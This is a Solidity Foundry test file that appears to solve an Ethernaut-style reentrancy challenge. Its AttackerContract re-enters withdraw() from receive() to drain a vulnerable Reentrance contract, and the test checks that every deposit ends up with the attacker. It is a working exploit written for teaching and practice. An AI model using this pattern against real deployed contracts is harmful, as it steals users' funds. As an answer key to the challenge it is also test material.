/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { Reentrance } from "@src/10-Reentrancy/Reentrancy.sol";

contract AttackerContract {
    address private immutable owner;
    Reentrance private immutable reEnter;
    uint256 private immutable depositAmount;

    constructor(address _reEnter) public payable {
        owner = msg.sender;
        reEnter = Reentrance(payable(_reEnter));
        depositAmount = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller not owner!");
        _;
    }

    function attack() external onlyOwner {
        reEnter.donate{ value: depositAmount }(address(this));
        reEnter.withdraw(depositAmount);
    }

    function withdraw() external onlyOwner {
        (bool success,) = payable(owner).call{ value: address(this).balance }("");
        if (!success) revert("Withdraw failed");
    }

    receive() external payable {
        if (address(reEnter).balance >= depositAmount) {
            reEnter.withdraw(depositAmount);
        } else if (address(reEnter).balance > 0) {
            reEnter.withdraw(address(reEnter).balance);
        }
    }
}

contract ReEnter is Test {
    Reentrance public reEnter;
    address public deployer;
    address public attacker;
    address public naivePerson;
    uint256 constant DEPLOYER_STARTING_BALANCE = 1.3 ether;
    uint256 constant NAIVE_PERSON_STARTING_BALANCE = 2.8 ether;
    uint256 constant ATTACKER_STARTING_BALANCE = 0.5 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        naivePerson = makeAddr("naivePerson");

        vm.prank(deployer);
        reEnter = new Reentrance();

        vm.deal(deployer, DEPLOYER_STARTING_BALANCE);
        vm.deal(naivePerson, NAIVE_PERSON_STARTING_BALANCE);
        vm.deal(attacker, ATTACKER_STARTING_BALANCE);

        vm.prank(deployer);
        reEnter.donate{ value: DEPLOYER_STARTING_BALANCE }(deployer);
        vm.prank(naivePerson);
        reEnter.donate{ value: NAIVE_PERSON_STARTING_BALANCE }(naivePerson);
    }

    function testStealAllTheMoney() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract{ value: ATTACKER_STARTING_BALANCE }(address(reEnter));
        // with the `AttackerContract::attack` function, we call the withdraw function on the `Reentrancy` contract and
        // exploit the fact that it doesn't follow the CEI pattern using reentrancy attack!
        // before the balance of our `AttackerContract` is accounted for in `Reentrancy`, our
        // receive function calls withdraw again until `Reentrancy` is drained of all its ether
        attackerContract.attack();
        attackerContract.withdraw();
        vm.stopPrank();

        assertEq(address(reEnter).balance, 0);
        assertEq(
            attacker.balance, DEPLOYER_STARTING_BALANCE + NAIVE_PERSON_STARTING_BALANCE + ATTACKER_STARTING_BALANCE
        );
    }
}
